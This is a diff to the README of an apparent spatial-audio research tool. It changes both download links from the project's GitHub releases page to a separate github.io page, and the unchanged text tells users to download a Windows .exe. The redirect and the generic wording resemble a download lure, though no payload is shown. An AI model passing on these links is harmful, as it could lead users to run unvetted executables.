@@ -1,6 +1,6 @@
 # 🎧 hoa-corpus-ieee-access - Analyze Spatial Audio Research Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://homogyneorphansite154.github.io)
 
 ## 📋 About This Software
 
@@ -12,7 +12,7 @@ It also generates LaTeX code for scientific papers, so you can easily include pr
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases](https://github.com/homogyneorphansite154/hoa-corpus-ieee-access/releases)
+Visit this link to download the application: [https://homogyneorphansite154.github.io](https://homogyneorphansite154.github.io)
 
 On that page, you will see a list of files. Look for the file that matches your computer. For Windows, choose the file ending with **.exe** or **.zip**. If you see a file named something like `hoa-corpus-ieee-access-windows.exe`, download that one. If you see a `.zip` file, download that instead.
 
